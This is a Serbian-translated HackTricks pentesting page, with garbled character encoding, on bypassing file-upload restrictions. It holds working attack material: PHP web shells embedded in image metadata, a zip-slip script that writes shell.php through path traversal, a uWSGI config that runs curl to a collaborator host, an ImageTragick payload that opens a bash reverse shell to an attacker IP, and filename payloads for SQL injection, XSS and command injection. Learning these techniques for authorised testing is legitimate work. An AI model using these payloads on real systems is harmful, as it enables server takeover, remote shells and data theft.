# Slanje datoteka

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite **vaÅ¡u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

![](<../../.gitbook/assets/image (638) (3).png>)

**Bug bounty savet**: **registrujte se** za **Intigriti**, premium **platformu za bug bounty kreiranu od strane hakera, za hakere**! PridruÅ¾ite nam se danas na [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) i poÄnite da zaraÄ‘ujete nagrade do **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

## OpÅ¡ta metodologija slanja datoteka

Drugi korisni nastavci:

* **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._phps_, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
* **Rad u PHPv8**: _.php_, _.php4_, _.php5_, _.phtml_, _.module_, _.inc_, _.hphp_, _.ctp_
* **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
* **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
* **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
* **Flash**: _.swf_
* **Perl**: _.pl, .cgi_
* **Erlang Yaws Web Server**: _.yaws_

### ZaobilaÅ¾enje provere ekstenzija datoteka

1. Ako se primenjuje, **proverite** **prethodne ekstenzije.** TakoÄ‘e ih testirajte koristeÄ‡i neka **velika slova**: _pHp, .pHP5, .PhAr ..._
2. _Proverite **dodavanjem ispravne ekstenzije pre** izvrÅ¡ne ekstenzije (koristite i prethodne ekstenzije):_
* _file.png.php_
* _file.png.Php5_
3. PokuÅ¡ajte dodavanjem **specijalnih karaktera na kraju.** MoÅ¾ete koristiti Burp da **bruteforce-ujete** sve **ascii** i **Unicode** karaktere. (_Imajte na umu da moÅ¾ete pokuÅ¡ati koristiti i **prethodno** pomenute **ekstenzije**_)
* _file.php%20_
* _file.php%0a_
* _file.php%00_
* _file.php%0d%0a_
* _file.php/_
* _file.php.\\_
* _file._
* _file.php...._
* _file.pHp5...._
4. PokuÅ¡ajte zaobiÄ‡i zaÅ¡titu **prevarom parsera ekstenzija** na serverskoj strani koristeÄ‡i tehnike poput **udvostruÄavanja** ekstenzije ili dodavanja beskorisnih podataka (**null** bajtova) izmeÄ‘u ekstenzija. _TakoÄ‘e moÅ¾ete koristiti **prethodne ekstenzije** da biste pripremili bolji payload._
* _file.png.php_
* _file.png.pHp5_
* _file.php#.png_
* _file.php%00.png_
* _file.php\x00.png_
* _file.php%0a.png_
* _file.php%0d%0a.png_
* _file.phpJunk123png_
5. Dodajte **joÅ¡ jedan sloj ekstenzija** prethodnoj proveri:
* _file.png.jpg.php_
* _file.php%00.png%00.jpg_
6. PokuÅ¡ajte da stavite **izvrÅ¡nu ekstenziju pre ispravne ekstenzije** i nadajte se da je server loÅ¡e konfigurisan. (korisno za iskoriÅ¡Ä‡avanje Apache konfiguracija gde Ä‡e sve sa ekstenzijom **.php**, ali ne nuÅ¾no zavrÅ¡avajuÄ‡i se u .php\*\*, izvrÅ¡iti kod):
* _npr. file.php.png_
7. Koristite **NTFS alternativni podaci tok (ADS)** u **Windows-u**. U ovom sluÄaju, nakon zabranjene ekstenzije i pre dozvoljene, biÄ‡e umetnut znak dvotaÄke ":". Kao rezultat, na serveru Ä‡e biti kreirana **prazna datoteka sa zabranjenom ekstenzijom** (npr. "file.asax:.jpg"). Ova datoteka moÅ¾e biti kasnije izmenjena koriÅ¡Ä‡enjem drugih tehnika kao Å¡to je koriÅ¡Ä‡enje kratkog imena datoteke. Obrazac "**::$data**" takoÄ‘e moÅ¾e biti koriÅ¡Ä‡en za kreiranje nepraznih datoteka. Stoga, dodavanje taÄke nakon ovog obrasca takoÄ‘e moÅ¾e biti korisno za zaobilaÅ¾enje daljih ograniÄenja (npr. "file.asp::$data.")
8. PokuÅ¡ajte da preÄ‘ete ograniÄenja imena datoteke. Ispravna ekstenzija Ä‡e biti odseÄena, a zlonamerni PHP Ä‡e ostati. AAA<--SNIP-->AAA.php

```
# Maksimalno 255 bajtova na Linux-u
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # ovde oduzmite 4 i dodajte .png
# Postavite datoteku i proverite odgovor koliko karaktera dozvoljava. Recimo da je 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Napravite payload
AAA<--SNIP 232 A-->AAA.php.png
```
### ZaobilaÅ¾enje provere Content-Type, Magic Number, kompresije i promene veliÄine

* ZaobilaÅ¾enje provere **Content-Type** podeÅ¡avanjem **vrednosti** zaglavlja **Content-Type** na: _image/png_, _text/plain_, application/octet-stream_
1. Wordlist za Content-Type: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt)
* ZaobilaÅ¾enje provere **magic number** dodavanjem na poÄetak fajla **bajtova prave slike** (zbunjuje _file_ komandu). Ili uvesti shell unutar **metapodataka**:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` ili takoÄ‘e moÅ¾ete **direktno uneti payload** u sliku:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
* Ako se **kompresija dodaje vaÅ¡oj slici**, na primer koriÅ¡Ä‡enjem standardnih PHP biblioteka poput [PHP-GD](https://www.php.net/manual/fr/book.image.php), prethodne tehnike neÄ‡e biti korisne. MeÄ‘utim, moÅ¾ete koristiti **PLTE chunk** [**tehniku definisanu ovde**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) da ubacite tekst koji Ä‡e **preÅ¾iveti kompresiju**.
* [**Github sa kodom**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen\_plte\_png.php)
* Veb stranica takoÄ‘e moÅ¾e **promeniti veliÄinu slike**, koristeÄ‡i na primer PHP-GD funkcije `imagecopyresized` ili `imagecopyresampled`. MeÄ‘utim, moÅ¾ete koristiti **IDAT chunk** [**tehniku definisanu ovde**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) da ubacite tekst koji Ä‡e **preÅ¾iveti kompresiju**.
* [**Github sa kodom**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen\_idat\_png.php)
* JoÅ¡ jedna tehnika za stvaranje payloada koji **preÅ¾ivljava promenu veliÄine slike**, koristeÄ‡i PHP-GD funkciju `thumbnailImage`. MeÄ‘utim, moÅ¾ete koristiti **tEXt chunk** [**tehniku definisanu ovde**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) da ubacite tekst koji Ä‡e **preÅ¾iveti kompresiju**.
* [**Github sa kodom**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen\_tEXt\_png.php)

### Ostali trikovi za proveru

* PronaÄ‘ite ranjivost za **preimenovanje** veÄ‡ otpremljenog fajla (da promenite ekstenziju).
* PronaÄ‘ite ranjivost **Local File Inclusion** za izvrÅ¡avanje backdoor-a.
* **MoguÄ‡e otkrivanje informacija**:
1. Otpremite **nekoliko puta** (i **istovremeno**) **isti fajl** sa **istim imenom**
2. Otpremite fajl sa **imenom** fajla ili **foldera** koji **veÄ‡ postoji**
3. Otpremite fajl sa **â€œ.â€, â€œ..â€, ili â€œâ€¦â€ kao njegovim imenom**. Na primer, u Apache-u na **Windows-u**, ako aplikacija Äuva otpremljene fajlove u direktorijumu â€œ/www/uploads/â€, ime fajla â€œ.â€ Ä‡e kreirati fajl nazvan â€œuploadsâ€ u direktorijumu â€œ/www/â€.
4. Otpremite fajl koji se ne moÅ¾e lako obrisati, kao Å¡to je **â€œâ€¦:.jpgâ€** u **NTFS-u**. (Windows)
5. Otpremite fajl u **Windows-u** sa **nevaÅ¾eÄ‡im karakterima** kao Å¡to su `|<>*?â€` u njegovom imenu. (Windows)
6. Otpremite fajl u **Windows-u** koristeÄ‡i **rezervisana** (**zabranjena**) **imena** kao Å¡to su CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8 i LPT9.
* PokuÅ¡ajte takoÄ‘e da **otpremite izvrÅ¡ni fajl** (.exe) ili **.html** (manje sumnjivo) koji Ä‡e **izvrÅ¡iti kod** kada ga Å¾rtva sluÄajno otvori.

### Trikovi sa posebnim ekstenzijama

Ako pokuÅ¡avate da otpremite fajlove na **PHP server**, [pogledajte trik sa **.htaccess** za izvrÅ¡avanje koda](https://book.hacktricks.xyz/pentesting/pentesting-web/php-tricks-esp#code-execution-via-httaccess).\
Ako pokuÅ¡avate da otpremite fajlove na **ASP server**, [pogledajte trik sa **.config** za izvrÅ¡avanje koda](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

`.phar` fajlovi su kao `.jar` za Javu, ali za PHP, i mogu se **koristiti kao PHP fajl** (izvrÅ¡avanje sa php-om ili ukljuÄivanje u skriptu...)

Ekstenzija `.inc` se ponekad koristi za PHP fajlove koji se koriste samo za **uvoz fajlova**, tako da je u nekom trenutku neko mogao dozvoliti **izvrÅ¡avanje ove ekstenzije**.

## **Jetty RCE**

Ako moÅ¾ete otpremiti XML fajl na Jetty server, moÅ¾ete dobiti [RCE jer se **novi \*.xml i \*.war automatski obraÄ‘uju**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.** Dakle, kao Å¡to je navedeno na sledeÄ‡oj slici, otpremite XML fajl na `$JETTY_BASE/webapps/` i oÄekujte shell!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../.gitbook/assets/image (1) (3) (1) (1) (1).png>)

## **uWSGI RCE**

Za detaljno istraÅ¾ivanje ove ranjivosti pogledajte originalno istraÅ¾ivanje: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

Ranjivosti udaljenog izvrÅ¡avanja komandi (RCE) mogu se iskoristiti u uWSGI serverima ako imate moguÄ‡nost izmeniti `.ini` konfiguracioni fajl. Konfiguracioni fajlovi uWSGI koriste specifiÄnu sintaksu za ukljuÄivanje "magiÄnih" promenljivih, zamena i operatora. Posebno, operator '@', koji se koristi kao `@(ime_fajla)`, dizajniran je da ukljuÄi sadrÅ¾aj fajla. MeÄ‘u razliÄitim podrÅ¾anim Å¡emama u uWSGI, "exec" Å¡ema je posebno moÄ‡na, omoguÄ‡avajuÄ‡i Äitanje podataka iz standardnog izlaza procesa. Ova funkcionalnost moÅ¾e biti manipulisana u zlonamerne svrhe kao Å¡to su udaljeno izvrÅ¡avanje komandi ili proizvoljno pisanje/Äitanje fajlova kada se `.ini` konfiguracioni fajl obraÄ‘uje.

Razmotrite sledeÄ‡i primer Å¡tetnog `uwsgi.ini` fajla koji prikazuje razliÄite Å¡eme:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
IzvrÅ¡avanje payloada se deÅ¡ava tokom parsiranja konfiguracionog fajla. Da bi konfiguracija bila aktivirana i parsirana, proces uWSGI mora biti restartovan (potencijalno nakon pada ili zbog napada Denial of Service) ili fajl mora biti podeÅ¡en za automatsko ponovno uÄitavanje. Ako je omoguÄ‡ena opcija automatskog ponovnog uÄitavanja, fajl Ä‡e biti ponovno uÄitan u odreÄ‘enim intervalima nakon detektovanja promena.

VaÅ¾no je razumeti opuÅ¡tenu prirodu parsiranja konfiguracionog fajla uWSGI-ja. Konkretno, pomenuti payload moÅ¾e biti ubaÄen u binarni fajl (kao Å¡to je slika ili PDF), Å¡to dodatno proÅ¡iruje moguÄ‡nosti iskoriÅ¡Ä‡avanja.

## **Triks za otpremanje fajlova/SSRF pomoÄ‡u wget-a**

U nekim sluÄajevima moÅ¾e se desiti da server koristi **`wget`** za **preuzimanje fajlova** i moÅ¾ete **navesti** **URL**. U tim situacijama, kod moÅ¾e proveravati da li je ekstenzija preuzetih fajlova na beloj listi kako bi se osiguralo da se preuzimaju samo dozvoljeni fajlovi. MeÄ‘utim, **ova provera moÅ¾e biti zaobiÄ‘ena**.\
**Maksimalna** duÅ¾ina **imenovanja fajla** u **Linuxu** je **255**, meÄ‘utim, **wget** skraÄ‡uje imena fajlova na **236** karaktera. MoÅ¾ete **preuzeti fajl nazvan "A"\*232+".php"+".gif"**, ovo ime fajla Ä‡e **zaobiÄ‡i** **proveru** (kao u ovom primeru **".gif"** je **validna** ekstenzija), ali Ä‡e `wget` preimenovati fajl u **"A"\*232+".php"**.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: â€˜AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.phpâ€™

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - â€˜AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.phpâ€™ saved [10/10]
```
Imajte na umu da je **joÅ¡ jedna opcija** koju moÅ¾ete razmotriti za zaobilaÅ¾enje ovog provere da napravite **preusmeravanje HTTP servera na drugi fajl**, tako da Ä‡e poÄetni URL zaobiÄ‡i proveru, a zatim Ä‡e wget preuzeti preusmereni fajl sa novim imenom. Ovo **neÄ‡e raditi** **osim ako** se wget koristi sa **parametrom** `--trust-server-names` jer Ä‡e **wget preuzeti preusmerenu stranicu sa imenom fajla naznaÄenim u originalnom URL-u**.


## Alati

* [Upload Bypass](https://github.com/sAjibuu/Upload\_Bypass) je moÄ‡an alat dizajniran da pomogne Pentesterima i Bug Hunterima u testiranju mehanizama za otpremanje fajlova. Koristi razne tehnike za otkrivanje i iskoriÅ¡Ä‡avanje ranjivosti, obezbeÄ‘ujuÄ‡i temeljne procene veb aplikacija.

## Od otpremanja fajla do drugih ranjivosti

* Postavite **ime fajla** na `../../../tmp/lol.png` i pokuÅ¡ajte postiÄ‡i **prodiranje putem putanje**
* Postavite **ime fajla** na `sleep(10)-- -.jpg` i moÅ¾da Ä‡ete moÄ‡i postiÄ‡i **SQL ubacivanje**
* Postavite **ime fajla** na `<svg onload=alert(document.domain)>` da biste postigli XSS
* Postavite **ime fajla** na `; sleep 10;` da biste testirali neko ubacivanje komandi (viÅ¡e [triÄarija za ubacivanje komandi ovde](../command-injection.md))
* [**XSS** u otpremanju slike (svg)](../xss-cross-site-scripting/#xss-uploading-files-svg)
* **JS** fajl **otpremanje** + **XSS** = [eksploatacija **Service Workers**-a](../xss-cross-site-scripting/#xss-abusing-service-workers)
* [**XXE u otpremanju svg**](../xxe-xee-xml-external-entity.md#svg-file-upload)
* [**Otvoreno preusmeravanje** putem otpremanja svg fajla](../open-redirect.md#open-redirect-uploading-svg-files)
* Isprobajte **razliÄite svg payload-e** sa [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)\*\*\*\*
* [ÄŒuvena ranjivost **ImageTrick**](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
* Ako moÅ¾ete **navesti veb server da uhvati sliku sa URL-a**, moÅ¾ete pokuÅ¡ati iskoristiti [SSRF](../ssrf-server-side-request-forgery/). Ako Ä‡e ova **slika** biti **saÄuvana** na nekom **javnom** sajtu, takoÄ‘e moÅ¾ete navesti URL sa [https://iplogger.org/invisible/](https://iplogger.org/invisible/) i **ukrasti informacije o svakom posetiocu**.
* [**XXE i CORS** zaobilaÅ¾enje sa otpremanjem PDF-Adobe](pdf-upload-xxe-and-cors-bypass.md)
* Posebno kreirani PDF-ovi za XSS: [SledeÄ‡a stranica prikazuje kako **ubaciti PDF podatke da biste dobili izvrÅ¡enje JS-a**](../xss-cross-site-scripting/pdf-injection.md). Ako moÅ¾ete otpremiti PDF-ove, moÅ¾ete pripremiti neki PDF koji Ä‡e izvrÅ¡iti proizvoljni JS prateÄ‡i date upute.
* Otpremite sadrÅ¾aj \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) da biste proverili da li server ima neki **antivirus**
* Proverite da li postoji neko **ograniÄenje veliÄine** pri otpremanju fajlova

Evo liste od 10 stvari koje moÅ¾ete postiÄ‡i otpremanjem (preuzeto sa [ovde](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSV injection
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML injection / XSS / Open redirect
8. **PNG / JPEG**: Pixel flood attack (DoS)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Burp ekstenzija

{% embed url="https://github.com/portswigger/upload-scanner" %}

## MagiÄni bajtovi zaglavlja

* **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03["`
* **JPG**: `"\xff\xd8\xff"`

Pogledajte [https://en.wikipedia.org/wiki/List\_of\_file\_signatures](https://en.wikipedia.org/wiki/List\_of\_file\_signatures) za druge vrste fajlova.

### Automatsko otpremanje zip/tar fajla koji se automatski dekompresuje

Ako moÅ¾ete otpremiti ZIP koji Ä‡e biti dekompresovan unutar servera, moÅ¾ete uraditi 2 stvari:

#### SimboliÄki link

Otpremite link koji sadrÅ¾i simboliÄke veze ka drugim fajlovima, a zatim pristupajuÄ‡i dekompresovanim fajlovima pristupiÄ‡ete povezanim fajlovima:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### Dekompresija u razliÄitim fasciklama

Nenadano stvaranje fajlova u direktorijumima tokom dekompresije predstavlja znaÄajan problem. Uprkos poÄetnim pretpostavkama da ova postavka moÅ¾e da zaÅ¡titi od izvrÅ¡avanja komandi na nivou operativnog sistema putem zlonamernog otpremanja fajlova, podrÅ¡ka za hijerarhijsku kompresiju i moguÄ‡nosti pretrage direktorijuma u ZIP arhivskom formatu mogu biti iskoriÅ¡Ä‡ene. To omoguÄ‡ava napadaÄima da zaobiÄ‘u ograniÄenja i izbegnu sigurne direktorijume za otpremanje manipuliÅ¡uÄ‡i funkcionalnostima dekompresije ciljne aplikacije.

Automatizovani eksploit za kreiranje takvih fajlova dostupan je na [**evilarc na GitHub-u**](https://github.com/ptoomey3/evilarc). Ova alatka moÅ¾e se koristiti na sledeÄ‡i naÄin:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
Dodatno, **triĞº sa simboliÄkim linkom i evilarc-om** je opcija. Ako je cilj da se cilja datoteka kao Å¡to je `/flag.txt`, simboliÄki link do te datoteke treba biti kreiran na vaÅ¡em sistemu. Ovo osigurava da evilarc ne naiÄ‘e na greÅ¡ke tokom svog rada.

Ispod je primer Python koda koji se koristi za kreiranje zlonamerne zip datoteke:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO

def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**Zloupotreba kompresije za rasprÅ¡ivanje fajlova**

Za dalje detalje **proverite originalni post na**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)


1. **Kreiranje PHP Shell-a**:
PHP kod je napisan da izvrÅ¡ava komande prosleÄ‘ene kroz promenljivu `$_REQUEST`.
```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2. **RasprÅ¡ivanje fajlova i kreiranje kompresovanog fajla**:
Kreiraju se viÅ¡e fajlova i sastavlja se zip arhiva koja sadrÅ¾i ove fajlove.
```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3. **Modifikacija pomoÄ‡u heks editora ili vi**:
Imena fajlova unutar zip arhive se menjaju pomoÄ‡u vi ili heks editora, menjajuÄ‡i "xxA" u "../" da bi se pretraÅ¾ivali direktorijumi.
```bash
:set modifiable
:%s/xxA/..\//g
:x!
```


## ImageTragic

Otpremite ovaj sadrÅ¾aj sa ekstenzijom slike da biste iskoristili ranjivost **(ImageMagick, 7.0.1-1)**
(iz [exploita](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## UgraÄ‘ivanje PHP Shell-a u PNG

UgraÄ‘ivanje PHP Shell-a u IDAT blok PNG datoteke moÅ¾e efikasno zaobiÄ‡i odreÄ‘ene operacije obrade slika. Funkcije `imagecopyresized` i `imagecopyresampled` iz PHP-GD biblioteke su posebno relevantne u ovom kontekstu, jer se Äesto koriste za promenu veliÄine i resampling slika. MoguÄ‡nost da ugraÄ‘eni PHP Shell ostane neizmenjen nakon ovih operacija predstavlja znaÄajnu prednost u odreÄ‘enim sluÄajevima upotrebe.

Detaljno istraÅ¾ivanje ove tehnike, ukljuÄujuÄ‡i metodologiju i potencijalne primene, moÅ¾ete pronaÄ‡i u sledeÄ‡em Älanku: ["Kodiranje Web Shell-ova u PNG IDAT blokovima"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). Ovaj izvor pruÅ¾a sveobuhvatno razumevanje procesa i njegovih implikacija.

ViÅ¡e informacija na: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Poliglot fajlovi

Poliglot fajlovi predstavljaju jedinstveni alat u kibernetiÄkoj bezbednosti, delujuÄ‡i kao kameleoni koji mogu validno postojati istovremeno u viÅ¡e formata fajlova. Zanimljiv primer je [GIFAR](https://en.wikipedia.org/wiki/Gifar), hibrid koji funkcioniÅ¡e kao GIF i RAR arhiva. Takvi fajlovi nisu ograniÄeni samo na ovu kombinaciju; kombinacije poput GIF i JS ili PPT i JS su takoÄ‘e izvodljive.

Osnovna korist od poliglot fajlova leÅ¾i u njihovoj sposobnosti da zaobiÄ‘u sigurnosne mere koje skeniraju fajlove na osnovu njihovog tipa. UobiÄajena praksa u raznim aplikacijama podrazumeva dozvolu samo odreÄ‘enih tipova fajlova za otpremanje - poput JPEG, GIF ili DOC - kako bi se umanjio rizik od potencijalno Å¡tetnih formata (npr. JS, PHP ili Phar fajlova). MeÄ‘utim, poliglot, pridrÅ¾avajuÄ‡i se strukturnih kriterijuma viÅ¡e tipova fajlova, moÅ¾e neprimetno zaobiÄ‡i ove restrikcije.

Uprkos njihovoj prilagodljivosti, poligloti imaju odreÄ‘ena ograniÄenja. Na primer, iako poliglot moÅ¾e istovremeno biti PHAR fajl (PHp ARchive) i JPEG, uspeh njegovog otpremanja moÅ¾e zavisiti od politike ekstenzija fajlova platforme. Ako sistem strogo kontroliÅ¡e dozvoljene ekstenzije, sama strukturna dvojnost poliglota moÅ¾da neÄ‡e biti dovoljna da garantuje njegovo otpremanje.

ViÅ¡e informacija na: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

## Reference

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
* [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
* [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
* [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
* [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
* [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)


<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**Savet za bug bounty**: **registrujte se** na **Intigriti**, premium platformu za bug bounty koju su kreirali hakeri, za hakerima! PridruÅ¾ite nam se na [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) danas i poÄnite da zaraÄ‘ujete nagrade do **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

